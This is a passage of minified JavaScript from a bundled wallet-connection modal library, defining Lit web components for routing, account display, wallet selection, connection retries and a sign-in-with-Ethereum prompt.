`;var c1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Fs=class extends H{constructor(){super(),this.resizeObserver=void 0,this.prevHeight="0px",this.prevHistoryLength=1,this.unsubscribe=[],this.view=ie.state.view,this.unsubscribe.push(ie.subscribeKey("view",e=>this.onViewChange(e)))}firstUpdated(){this.resizeObserver=new ResizeObserver(async([e])=>{const n=`${e==null?void 0:e.contentRect.height}px`;this.prevHeight!=="0px"&&(await this.animate([{height:this.prevHeight},{height:n}],{duration:150,easing:"ease",fill:"forwards"}).finished,this.style.height="auto"),this.prevHeight=n}),this.resizeObserver.observe(this.getWrapper())}disconnectedCallback(){var e;(e=this.resizeObserver)==null||e.unobserve(this.getWrapper()),this.unsubscribe.forEach(n=>n())}render(){return $`<div>${this.viewTemplate()}</div>`}viewTemplate(){switch(this.view){case"Connect":return $`<w3m-connect-view></w3m-connect-view>`;case"ConnectingWalletConnect":return $`<w3m-connecting-wc-view></w3m-connecting-wc-view>`;case"ConnectingExternal":return $`<w3m-connecting-external-view></w3m-connecting-external-view>`;case"ConnectingSiwe":return $`<w3m-connecting-siwe-view></w3m-connecting-siwe-view>`;case"AllWallets":return $`<w3m-all-wallets-view></w3m-all-wallets-view>`;case"Networks":return $`<w3m-networks-view></w3m-networks-view>`;case"SwitchNetwork":return $`<w3m-network-switch-view></w3m-network-switch-view>`;case"Account":return $`<w3m-account-view></w3m-account-view>`;case"WhatIsAWallet":return $`<w3m-what-is-a-wallet-view></w3m-what-is-a-wallet-view>`;case"WhatIsANetwork":return $`<w3m-what-is-a-network-view></w3m-what-is-a-network-view>`;case"GetWallet":return $`<w3m-get-wallet-view></w3m-get-wallet-view>`;case"Downloads":return $`<w3m-downloads-view></w3m-downloads-view>`;case"EmailVerifyOtp":return $`<w3m-email-verify-otp-view></w3m-email-verify-otp-view>`;case"EmailVerifyDevice":return $`<w3m-email-verify-device-view></w3m-email-verify-device-view>`;case"ApproveTransaction":return $`<w3m-approve-transaction-view></w3m-approve-transaction-view>`;case"Transactions":return $`<w3m-transactions-view></w3m-transactions-view>`;case"UpgradeEmailWallet":return $`<w3m-upgrade-wallet-view></w3m-upgrade-wallet-view>`;case"UpdateEmailWallet":return $`<w3m-update-email-wallet-view></w3m-update-email-wallet-view>`;case"UpdateEmailWalletWaiting":return $`<w3m-update-email-wallet-waiting-view></w3m-update-email-wallet-waiting-view>`;default:return $`<w3m-connect-view></w3m-connect-view>`}}async onViewChange(e){const{history:n}=ie.state;let r=-10,o=10;n.length<this.prevHistoryLength&&(r=10,o=-10),this.prevHistoryLength=n.length,await this.animate([{opacity:1,transform:"translateX(0px)"},{opacity:0,transform:`translateX(${r}px)`}],{duration:150,easing:"ease",fill:"forwards"}).finished,this.view=e,await this.animate([{opacity:0,transform:`translateX(${o}px)`},{opacity:1,transform:"translateX(0px)"}],{duration:150,easing:"ease",fill:"forwards",delay:50}).finished}getWrapper(){var e;return(e=this.shadowRoot)==null?void 0:e.querySelector("div")}};Fs.styles=M5;c1([ee()],Fs.prototype,"view",void 0);Fs=c1([z("w3m-router")],Fs);const U5=q`
  wui-flex {
    width: 100%;
  }

  :host > wui-flex:first-child {
    transform: translateY(calc(var(--wui-spacing-xxs) * -1));
  }

  wui-icon-link {
    margin-right: calc(var(--wui-icon-box-size-md) * -1);
  }

  wui-notice-card {
    margin-bottom: var(--wui-spacing-3xs);
  }
`;var Tr=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let In=class extends H{constructor(){super(),this.usubscribe=[],this.address=ke.state.address,this.profileImage=ke.state.profileImage,this.profileName=ke.state.profileName,this.balance=ke.state.balance,this.balanceSymbol=ke.state.balanceSymbol,this.network=Qe.state.caipNetwork,this.disconecting=!1,this.usubscribe.push(ke.subscribe(e=>{e.address?(this.address=e.address,this.profileImage=e.profileImage,this.profileName=e.profileName,this.balance=e.balance,this.balanceSymbol=e.balanceSymbol):ze.close()}),Qe.subscribeKey("caipNetwork",e=>{e!=null&&e.id&&(this.network=e)}))}disconnectedCallback(){this.usubscribe.forEach(e=>e())}render(){var n;if(!this.address)throw new Error("w3m-account-view: No account provided");const e=Xe.getNetworkImage(this.network);return $`
      <wui-flex
        flexDirection="column"
        .padding=${["0","s","m","s"]}
        alignItems="center"
        gap="l"
      >
        <wui-avatar
          alt=${this.address}
          address=${this.address}
          imageSrc=${ve(this.profileImage===null?void 0:this.profileImage)}
        ></wui-avatar>

        <wui-flex flexDirection="column" alignItems="center">
          <wui-flex gap="3xs" alignItems="center" justifyContent="center">
            <wui-text variant="large-600" color="fg-100">
              ${this.profileName?Be.getTruncateString({string:this.profileName,charsStart:20,charsEnd:0,truncate:"end"}):Be.getTruncateString({string:this.address,charsStart:4,charsEnd:6,truncate:"middle"})}
            </wui-text>
            <wui-icon-link
              size="md"
              icon="copy"
              iconColor="fg-200"
              @click=${this.onCopyAddress}
            ></wui-icon-link>
          </wui-flex>
          <wui-flex gap="s" flexDirection="column" alignItems="center">
            <wui-text variant="paragraph-500" color="fg-200">
              ${le.formatBalance(this.balance,this.balanceSymbol)}
            </wui-text>

            ${this.explorerBtnTemplate()}
          </wui-flex>
        </wui-flex>
      </wui-flex>

      <wui-flex flexDirection="column" gap="xs" .padding=${["0","s","s","s"]}>
        ${this.emailCardTemplate()} ${this.emailBtnTemplate()}

        <wui-list-item
          .variant=${e?"image":"icon"}
          iconVariant="overlay"
          icon="networkPlaceholder"
          imageSrc=${ve(e)}
          ?chevron=${this.isAllowedNetworkSwitch()}
          @click=${this.onNetworks.bind(this)}
          data-testid="w3m-account-select-network"
        >
          <wui-text variant="paragraph-500" color="fg-100">
            ${((n=this.network)==null?void 0:n.name)??"Unknown"}
          </wui-text>
        </wui-list-item>
        <wui-list-item
          iconVariant="blue"
          icon="swapHorizontalBold"
          iconSize="sm"
          ?chevron=${!0}
          @click=${this.onTransactions.bind(this)}
        >
          <wui-text variant="paragraph-500" color="fg-100">Activity</wui-text>
        </wui-list-item>
        <wui-list-item
          variant="icon"
          iconVariant="overlay"
          icon="disconnect"
          ?chevron=${!1}
          .loading=${this.disconecting}
          @click=${this.onDisconnect.bind(this)}
          data-testid="disconnect-button"
        >
          <wui-text variant="paragraph-500" color="fg-200">Disconnect</wui-text>
        </wui-list-item>
      </wui-flex>
    `}emailCardTemplate(){const e=_t.getConnectedConnector(),n=We.getEmailConnector(),{origin:r}=location;return!n||e!=="EMAIL"||r.includes(Bn.SECURE_SITE)?null:$`
      <wui-notice-card
        @click=${this.onGoToUpgradeView.bind(this)}
        label="Upgrade your wallet"
        description="Transition to a non-custodial wallet"
        icon="wallet"
      ></wui-notice-card>
    `}emailBtnTemplate(){const e=_t.getConnectedConnector(),n=We.getEmailConnector();if(!n||e!=="EMAIL")return null;const r=n.provider.getEmail()??"";return $`
      <wui-list-item
        variant="icon"
        iconVariant="overlay"
        icon="mail"
        iconSize="sm"
        ?chevron=${!0}
        @click=${()=>this.onGoToUpdateEmail(r)}
      >
        <wui-text variant="paragraph-500" color="fg-100">${r}</wui-text>
      </wui-list-item>
    `}explorerBtnTemplate(){const{addressExplorerUrl:e}=ke.state;return e?$`
      <wui-button size="sm" variant="shade" @click=${this.onExplorer.bind(this)}>
        <wui-icon size="sm" color="inherit" slot="iconLeft" name="compass"></wui-icon>
        Block Explorer
        <wui-icon size="sm" color="inherit" slot="iconRight" name="externalLink"></wui-icon>
      </wui-button>
    `:null}isAllowedNetworkSwitch(){const{requestedCaipNetworks:e}=Qe.state,n=e?e.length>1:!1,r=e==null?void 0:e.find(({id:o})=>{var i;return o===((i=this.network)==null?void 0:i.id)});return n||!r}onCopyAddress(){try{this.address&&(le.copyToClopboard(this.address),et.showSuccess("Address copied"))}catch{et.showError("Failed to copy")}}onNetworks(){this.isAllowedNetworkSwitch()&&ie.push("Networks")}onTransactions(){we.sendEvent({type:"track",event:"CLICK_TRANSACTIONS"}),ie.push("Transactions")}async onDisconnect(){try{this.disconecting=!0,await Re.disconnect(),we.sendEvent({type:"track",event:"DISCONNECT_SUCCESS"}),ze.close()}catch{we.sendEvent({type:"track",event:"DISCONNECT_ERROR"}),et.showError("Failed to disconnect")}finally{this.disconecting=!1}}onExplorer(){const{addressExplorerUrl:e}=ke.state;e&&le.openHref(e,"_blank")}onGoToUpgradeView(){we.sendEvent({type:"track",event:"EMAIL_UPGRADE_FROM_MODAL"}),ie.push("UpgradeEmailWallet")}onGoToUpdateEmail(e){ie.push("UpdateEmailWallet",{email:e})}};In.styles=U5;Tr([ee()],In.prototype,"address",void 0);Tr([ee()],In.prototype,"profileImage",void 0);Tr([ee()],In.prototype,"profileName",void 0);Tr([ee()],In.prototype,"balance",void 0);Tr([ee()],In.prototype,"balanceSymbol",void 0);Tr([ee()],In.prototype,"network",void 0);Tr([ee()],In.prototype,"disconecting",void 0);In=Tr([z("w3m-account-view")],In);var l1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let vu=class extends H{constructor(){super(...arguments),this.search="",this.onDebouncedSearch=le.debounce(e=>{this.search=e})}render(){const e=this.search.length>=2;return $`
      <wui-flex padding="s" gap="s">
        <wui-search-bar @inputChange=${this.onInputChange.bind(this)}></wui-search-bar>
        ${this.qrButtonTemplate()}
      </wui-flex>
      ${e?$`<w3m-all-wallets-search query=${this.search}></w3m-all-wallets-search>`:$`<w3m-all-wallets-list></w3m-all-wallets-list>`}
    `}onInputChange(e){this.onDebouncedSearch(e.detail)}qrButtonTemplate(){return le.isMobile()?$`
        <wui-icon-box
          size="lg"
          iconSize="xl"
          iconColor="accent-100"
          backgroundColor="accent-100"
          icon="qrCode"
          background="transparent"
          border
          borderColor="wui-accent-glass-010"
          @click=${this.onWalletConnectQr.bind(this)}
        ></wui-icon-box>
      `:null}onWalletConnectQr(){ie.push("ConnectingWalletConnect")}};l1([ee()],vu.prototype,"search",void 0);vu=l1([z("w3m-all-wallets-view")],vu);const B5=q`
  wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
  }

  wui-flex::-webkit-scrollbar {
    display: none;
  }
`;var u1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Ws=class extends H{constructor(){super(),this.unsubscribe=[],this.connectors=We.state.connectors,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return $`
      <wui-flex flexDirection="column" padding="s" gap="xs">
        <w3m-email-login-widget></w3m-email-login-widget>

        ${this.walletConnectConnectorTemplate()} ${this.recentTemplate()}
        ${this.announcedTemplate()} ${this.injectedTemplate()} ${this.featuredTemplate()}
        ${this.customTemplate()} ${this.recommendedTemplate()} ${this.connectorsTemplate()}
        ${this.allWalletsTemplate()}
      </wui-flex>
      <w3m-legal-footer></w3m-legal-footer>
    `}walletConnectConnectorTemplate(){if(le.isMobile())return null;const e=this.connectors.find(n=>n.type==="WALLET_CONNECT");return e?$`
      <wui-list-wallet
        imageSrc=${ve(Xe.getConnectorImage(e))}
        name=${e.name??"Unknown"}
        @click=${()=>this.onConnector(e)}
        tagLabel="qr code"
        tagVariant="main"
        data-testid="wallet-selector-walletconnect"
      >
      </wui-list-wallet>
    `:null}customTemplate(){const{customWallets:e}=Ue.state;return e!=null&&e.length?this.filterOutDuplicateWallets(e).map(r=>$`
        <wui-list-wallet
          imageSrc=${ve(Xe.getWalletImage(r))}
          name=${r.name??"Unknown"}
          @click=${()=>this.onConnectWallet(r)}
        >
        </wui-list-wallet>
      `):null}featuredTemplate(){if(!this.connectors.find(o=>o.type==="WALLET_CONNECT"))return null;const{featured:n}=Pe.state;return n.length?this.filterOutDuplicateWallets(n).map(o=>$`
        <wui-list-wallet
          imageSrc=${ve(Xe.getWalletImage(o))}
          name=${o.name??"Unknown"}
          @click=${()=>this.onConnectWallet(o)}
        >
        </wui-list-wallet>
      `):null}recentTemplate(){return _t.getRecentWallets().map(n=>$`
        <wui-list-wallet
          imageSrc=${ve(Xe.getWalletImage(n))}
          name=${n.name??"Unknown"}
          @click=${()=>this.onConnectWallet(n)}
          tagLabel="recent"
          tagVariant="shade"
        >
        </wui-list-wallet>
      `)}announcedTemplate(){return this.connectors.map(e=>e.type!=="ANNOUNCED"?null:$`
        <wui-list-wallet
          imageSrc=${ve(Xe.getConnectorImage(e))}
          name=${e.name??"Unknown"}
          @click=${()=>this.onConnector(e)}
          tagVariant="success"
          .installed=${!0}
        >
        </wui-list-wallet>
      `)}injectedTemplate(){const e=this.connectors.find(n=>n.type==="ANNOUNCED");return this.connectors.map(n=>n.type!=="INJECTED"||!Re.checkInstalled()?null:$`
        <wui-list-wallet
          imageSrc=${ve(Xe.getConnectorImage(n))}
          .installed=${!!e}
          name=${n.name??"Unknown"}
          @click=${()=>this.onConnector(n)}
        >
        </wui-list-wallet>
      `)}connectorsTemplate(){const e=We.getAnnouncedConnectorRdns();return this.connectors.map(n=>["WALLET_CONNECT","INJECTED","ANNOUNCED","EMAIL"].includes(n.type)||e.includes(Bn.CONNECTOR_RDNS_MAP[n.id])?null:$`
        <wui-list-wallet
          imageSrc=${ve(Xe.getConnectorImage(n))}
          name=${n.name??"Unknown"}
          @click=${()=>this.onConnector(n)}
        >
        </wui-list-wallet>
      `)}allWalletsTemplate(){if(!this.connectors.find(s=>s.type==="WALLET_CONNECT"))return null;const n=Pe.state.count,r=Pe.state.featured.length,o=n+r,i=o<10?o:Math.floor(o/10)*10,a=i<o?`${i}+`:`${i}`;return $`
      <wui-list-wallet
        name="All Wallets"
        walletIcon="allWallets"
        showAllWallets
        @click=${this.onAllWallets.bind(this)}
        tagLabel=${a}
        tagVariant="shade"
        data-testid="all-wallets"
      ></wui-list-wallet>
    `}recommendedTemplate(){if(!this.connectors.find(p=>p.type==="WALLET_CONNECT"))return null;const{recommended:n}=Pe.state,{customWallets:r,featuredWalletIds:o}=Ue.state,{connectors:i}=We.state,a=_t.getRecentWallets(),s=i.filter(p=>p.type==="ANNOUNCED");if(o||r||!n.length)return null;const c=s.length+a.length,l=Math.max(0,2-c);return this.filterOutDuplicateWallets(n).slice(0,l).map(p=>$`
        <wui-list-wallet
          imageSrc=${ve(Xe.getWalletImage(p))}
          name=${(p==null?void 0:p.name)??"Unknown"}
          @click=${()=>this.onConnectWallet(p)}
        >
        </wui-list-wallet>
      `)}onConnector(e){e.type==="WALLET_CONNECT"?le.isMobile()?ie.push("AllWallets"):ie.push("ConnectingWalletConnect"):ie.push("ConnectingExternal",{connector:e})}filterOutDuplicateWallets(e){const{connectors:n}=We.state,o=_t.getRecentWallets().map(s=>s.id),i=n.map(s=>{var c;return(c=s.info)==null?void 0:c.rdns}).filter(Boolean);return e.filter(s=>!o.includes(s.id)&&!i.includes(s.rdns??void 0))}onAllWallets(){we.sendEvent({type:"track",event:"CLICK_ALL_WALLETS"}),ie.push("AllWallets")}onConnectWallet(e){ie.push("ConnectingWalletConnect",{wallet:e})}};Ws.styles=B5;u1([ee()],Ws.prototype,"connectors",void 0);Ws=u1([z("w3m-connect-view")],Ws);const L5=q`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }
`;var mi=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};class Nt extends H{constructor(){var e,n,r,o;super(),this.wallet=(e=ie.state.data)==null?void 0:e.wallet,this.connector=(n=ie.state.data)==null?void 0:n.connector,this.timeout=void 0,this.secondaryBtnLabel="Try again",this.secondaryBtnIcon="refresh",this.secondaryLabel="Accept connection request in the wallet",this.onConnect=void 0,this.onRender=void 0,this.onAutoConnect=void 0,this.isWalletConnect=!0,this.unsubscribe=[],this.imageSrc=Xe.getWalletImage(this.wallet)??Xe.getConnectorImage(this.connector),this.name=((r=this.wallet)==null?void 0:r.name)??((o=this.connector)==null?void 0:o.name)??"Wallet",this.isRetrying=!1,this.uri=Re.state.wcUri,this.error=Re.state.wcError,this.ready=!1,this.showRetry=!1,this.buffering=!1,this.isMobile=!1,this.onRetry=void 0,this.unsubscribe.push(Re.subscribeKey("wcUri",i=>{var a;this.uri=i,this.isRetrying&&this.onRetry&&(this.isRetrying=!1,(a=this.onConnect)==null||a.call(this))}),Re.subscribeKey("wcError",i=>this.error=i),Re.subscribeKey("buffering",i=>this.buffering=i))}firstUpdated(){var e;(e=this.onAutoConnect)==null||e.call(this),this.showRetry=!this.onAutoConnect}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),clearTimeout(this.timeout)}render(){var r;(r=this.onRender)==null||r.call(this),this.onShowRetry();const e=this.error?"Connection can be declined if a previous request is still active":this.secondaryLabel;let n=`Continue in ${this.name}`;return this.buffering&&(n="Connecting..."),this.error&&(n="Connection declined"),$`
      <wui-flex
        data-error=${ve(this.error)}
        data-retry=${this.showRetry}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-wallet-image size="lg" imageSrc=${ve(this.imageSrc)}></wui-wallet-image>

          ${this.error?null:this.loaderTemplate()}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text variant="paragraph-500" color=${this.error?"error-100":"fg-100"}>
            ${n}
          </wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${e}</wui-text>
        </wui-flex>

        <wui-button
          variant="accent"
          ?disabled=${!this.error&&this.buffering}
          @click=${this.onTryAgain.bind(this)}
        >
          <wui-icon color="inherit" slot="iconLeft" name=${this.secondaryBtnIcon}></wui-icon>
          ${this.secondaryBtnLabel}
        </wui-button>
      </wui-flex>

      ${this.isWalletConnect?$`
            <wui-flex .padding=${["0","xl","xl","xl"]} justifyContent="center">
              <wui-link @click=${this.onCopyUri} color="fg-200">
                <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
                Copy link
              </wui-link>
            </wui-flex>
          `:null}

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onShowRetry(){var e;this.error&&!this.showRetry&&(this.showRetry=!0,((e=this.shadowRoot)==null?void 0:e.querySelector("wui-button")).animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}onTryAgain(){var e,n;this.buffering||(Re.setWcError(!1),this.onRetry?(this.isRetrying=!0,(e=this.onRetry)==null||e.call(this)):(n=this.onConnect)==null||n.call(this))}loaderTemplate(){const e=It.state.themeVariables["--w3m-border-radius-master"],n=e?parseInt(e.replace("px",""),10):4;return $`<wui-loading-thumbnail radius=${n*9}></wui-loading-thumbnail>`}onCopyUri(){try{this.uri&&(le.copyToClopboard(this.uri),et.showSuccess("Link copied"))}catch{et.showError("Failed to copy")}}}Nt.styles=L5;mi([ee()],Nt.prototype,"uri",void 0);mi([ee()],Nt.prototype,"error",void 0);mi([ee()],Nt.prototype,"ready",void 0);mi([ee()],Nt.prototype,"showRetry",void 0);mi([ee()],Nt.prototype,"buffering",void 0);mi([O({type:Boolean})],Nt.prototype,"isMobile",void 0);mi([O()],Nt.prototype,"onRetry",void 0);var j5=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const F5={INJECTED:"browser",ANNOUNCED:"browser"};let d0=class extends Nt{constructor(){if(super(),!this.connector)throw new Error("w3m-connecting-view: No connector provided");we.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.connector.name??"Unknown",platform:F5[this.connector.type]??"external"}}),this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),this.isWalletConnect=!1}async onConnectProxy(){try{this.error=!1,this.connector&&(this.connector.imageUrl&&_t.setConnectedWalletImageUrl(this.connector.imageUrl),await Re.connectExternal(this.connector),nt.state.isSiweEnabled?ie.push("ConnectingSiwe"):ze.close(),we.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"external"}}))}catch(e){we.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(e==null?void 0:e.message)??"Unknown"}}),this.error=!0}}};d0=j5([z("w3m-connecting-external-view")],d0);var d1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let xu=class extends H{constructor(){var e;super(...arguments),this.dappName=(e=Ue.state.metadata)==null?void 0:e.name,this.isSigning=!1}render(){return $`
      <wui-flex justifyContent="center" .padding=${["2xl","0","xxl","0"]}>
        <w3m-connecting-siwe></w3m-connecting-siwe>
      </wui-flex>
      <wui-flex
        .padding=${["0","4xl","l","4xl"]}
        gap="s"
        justifyContent="space-between"
      >
        <wui-text variant="paragraph-500" align="center" color="fg-100"
          >${this.dappName??"Dapp"} needs to connect to your wallet</wui-text
        >
      </wui-flex>
      <wui-flex
        .padding=${["0","3xl","l","3xl"]}
        gap="s"
        justifyContent="space-between"
      >
        <wui-text variant="small-400" align="center" color="fg-200"
          >Sign this message to prove you own this wallet and proceed. Canceling will disconnect
          you.</wui-text
        >
      </wui-flex>
      <wui-flex .padding=${["l","xl","xl","xl"]} gap="s" justifyContent="space-between">
        <wui-button
          size="md"
          ?fullwidth=${!0}
          variant="shade"
          @click=${this.onCancel.bind(this)}
          data-testid="w3m-connecting-siwe-cancel"
        >
          Cancel
        </wui-button>
        <wui-button
          size="md"
          ?fullwidth=${!0}
          variant="fill"
          @click=${this.onSign.bind(this)}
          ?loading=${this.isSigning}
          data-testid="w3m-connecting-siwe-sign"
        >
          ${this.isSigning?"Signing...":"Sign"}
        </wui-button>
      </wui-flex>
    `}async onSign(){this.isSigning=!0,we.sendEvent({event:"CLICK_SIGN_SIWE_MESSAGE",type:"track"});try{nt.setStatus("loading");const e=await nt.signIn();return nt.setStatus("success"),we.sendEvent({event:"SIWE_AUTH_SUCCESS",type:"track"}),e}catch{return et.showError("Signature declined"),nt.setStatus("error"),we.sendEvent({event:"SIWE_AUTH_ERROR",type:"track"})}finally{this.isSigning=!1}}async onCancel(){const{isConnected:e}=ke.state;e?(await Re.disconnect(),ze.close()):ie.push("Connect"),we.sendEvent({event:"CLICK_CANCEL_SIWE",type:"track"})}};d1([ee()],xu.prototype,"isSigning",void 0);xu=d1([z("w3m-connecting-siwe-view")],xu);var Kd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let zs=class extends H{constructor(){var e;super(),this.interval=void 0,this.lastRetry=Date.now(),this.wallet=(e=ie.state.data)==null?void 0:e.wallet,this.platform=void 0,this.platforms=[],this.initializeConnection(),this.interval=setInterval(this.initializeConnection.bind(this),Bn.TEN_SEC_MS)}disconnectedCallback(){clearTimeout(this.interval)}render(){return this.wallet?(this.determinePlatforms(),$`
      ${this.headerTemplate()}
      <div>${this.platformTemplate()}</div>
    `):$`<w3m-connecting-wc-qrcode></w3m-connecting-wc-qrcode>`}async initializeConnection(e=!1){try{const{wcPairingExpiry:n}=Re.state;if(e||le.isPairingExpired(n)){if(Re.connectWalletConnect(),this.wallet){const r=Xe.getWalletImage(this.wallet);r&&_t.setConnectedWalletImageUrl(r)}else{const o=We.state.connectors.find(a=>a.type==="WALLET_CONNECT"),i=Xe.getConnectorImage(o);i&&_t.setConnectedWalletImageUrl(i)}await Re.state.wcPromise,this.finalizeConnection(),nt.state.isSiweEnabled?ie.push("ConnectingSiwe"):ze.close()}}catch(n){we.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(n==null?void 0:n.message)??"Unknown"}}),Re.setWcError(!0),le.isAllowedRetry(this.lastRetry)&&(et.showError("Declined"),this.lastRetry=Date.now(),this.initializeConnection(!0))}}finalizeConnection(){const{wcLinking:e,recentWallet:n}=Re.state;e&&_t.setWalletConnectDeepLink(e),n&&_t.setWeb3ModalRecent(n),we.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:e?"mobile":"qrcode"}})}determinePlatforms(){if(!this.wallet)throw new Error("w3m-connecting-wc-view:determinePlatforms No wallet");if(this.platform)return;const{mobile_link:e,desktop_link:n,webapp_link:r,injected:o,rdns:i}=this.wallet,a=o==null?void 0:o.map(({injected_id:w})=>w).filter(Boolean),s=i?[i]:a??[],c=s.length,l=e,u=r,p=Re.checkInstalled(s),m=c&&p,g=n&&!le.isMobile();m&&this.platforms.push("browser"),l&&this.platforms.push(le.isMobile()?"mobile":"qrcode"),u&&this.platforms.push("web"),g&&this.platforms.push("desktop"),!m&&c&&this.platforms.push("unsupported"),this.platform=this.platforms[0]}platformTemplate(){switch(this.platform){case"browser":return $`<w3m-connecting-wc-browser></w3m-connecting-wc-browser>`;case"desktop":return $`
          <w3m-connecting-wc-desktop .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-desktop>
        `;case"web":return $`
          <w3m-connecting-wc-web .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-web>
        `;case"mobile":return $`
          <w3m-connecting-wc-mobile isMobile .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-mobile>
        `;case"qrcode":return $`<w3m-connecting-wc-qrcode></w3m-connecting-wc-qrcode>`;default:return $`<w3m-connecting-wc-unsupported></w3m-connecting-wc-unsupported>`}}headerTemplate(){return this.platforms.length>1?$`
      <w3m-connecting-header
        .platforms=${this.platforms}
        .onSelectPlatfrom=${this.onSelectPlatform.bind(this)}
      >
      </w3m-connecting-header>
